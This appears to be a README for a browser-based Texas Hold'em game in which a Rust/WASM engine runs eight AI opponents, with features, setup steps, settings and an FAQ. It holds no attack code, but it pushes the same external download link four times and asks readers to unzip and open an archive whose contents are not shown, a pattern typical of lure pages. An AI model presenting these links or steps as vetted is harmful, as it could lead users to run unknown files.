# pkarena0-web - Texas Hold'em Solo Arena 2026

> **A browser-based, single-player Texas Hold'em simulator where you play against eight AI opponents, with everything powered locally through WebAssembly.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/kevin-cooper1989/pkarena0-web-ai-poker?style=flat-square)](https://github.com/kevin-cooper1989/pkarena0-web-ai-poker)

---

<p align="center">
  <a href="https://kevin-cooper1989.github.io/pkarena0-web-ai-poker/">
    <img src="https://img.shields.io/badge/Download-pkarena0--web%20Script-brightgreen?style=for-the-badge" alt="Download pkarena0-web Script">
  </a>
</p>

> **[Direct Download - pkarena0-web](https://kevin-cooper1989.github.io/pkarena0-web-ai-poker/)**

---

[Download Latest Build](https://kevin-cooper1989.github.io/pkarena0-web-ai-poker/)

---

## What It Is

pkarena0-web turns a Texas Hold'em table into a self-contained web experience. A Rust game core compiled to WebAssembly drives the match flow, while eight AI opponents with different play styles keep each hand from feeling predictable. Once the page is loaded, everything runs in the browser, so no backend service or ongoing internet access is needed.

The 2026 release adds animated opponent moves, reveals hole cards at showdown, and includes an experimental narration mode for audio commentary. Matches end on their own once the table drops below two active players. For post-game study, you can export hand histories as YAML files.

---

## Features

- **Solo Texas Hold'em play** against eight distinct AI bots with different aggression tendencies
- **Rust engine compiled to WASM** for quick, deterministic dealing and turn logic
- **Serverless operation** - works as a static HTML page for offline use or local hosting
- **Animated bot actions** with on-screen feedback for bet, call, raise, fold, and all-in
- **Showdown card reveal** shows both hole cards for the players still in the hand
- **Automatic end-of-session handling** when only one or zero players are left active
- **YAML hand history export** for review after the session or for outside analysis
- **Experimental audio narration** that can speak game events during play

---

## Getting Started

1. Download the latest build from the link above.
2. Unzip the archive into a directory on your machine.
3. Open `index.html` in a current browser such as Chrome, Firefox, Edge, or Safari.
4. Play starts right away - no installation, build step, or web server is required.

If you want to run it locally for development or adjustments, any static file server will do, such as `python -m http.server 8000`.

---

## Configuration

You can change the available settings from the in-game menu or by editing `config.js` directly:

| Setting | Default | Description |
|---------|-------------|-------------|
| `audioNarration` | `false` | Enable experimental voice commentary during hands |
| `animationSpeed` | `1.0` | Multiplier for bot action animations (0.5–2.0) |
| `autoFoldDelay` | `2000` | Milliseconds before AI auto-folds when idle |
| `exportFormat` | `yaml` | Hand history output format (YAML only currently) |

Example configuration block:

```javascript
// config.js
const settings = {
  audioNarration: false,
  animationSpeed: 1.0,
  autoFoldDelay: 2000,
  exportFormat: 'yaml'
};
```

---

## Compatibility Notes

- **Supported platforms:** Any modern web browser with WebAssembly support (Chrome 57+, Firefox 52+, Edge 16+, Safari 11+)
- **Supported game versions:** All standard Texas Hold'em variants (fixed-limit, no-limit, pot-limit)
- **Known limitations:** Audio narration is experimental and may not work in all browsers. The game is optimized for desktop screen sizes; mobile layout may be cramped.
- **No server-side components** - all logic runs locally in the browser.

---

## Common Questions

**How do I start a new game?**  
Refresh the page or use the "New Game" button in the menu. That will deal a new table with eight AI opponents.

**Can I update the bot profiles?**  
Yes. Bot behavior settings live in `bots.json`. There you can adjust aggression levels, starting stacks, and names.

**How do I customize the game?**  
Use `config.js` to alter animation speed, audio options, or export behavior. For larger changes, edit the Rust source and rebuild to WASM.

**Does this work on mobile devices?**  
It may run on tablets, but the UI was built with desktop displays in mind. Touch input is not fully supported.

**Where are my hand histories saved?**  
Downloaded YAML files go to your browser's default download folder. Nothing is stored on a server.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
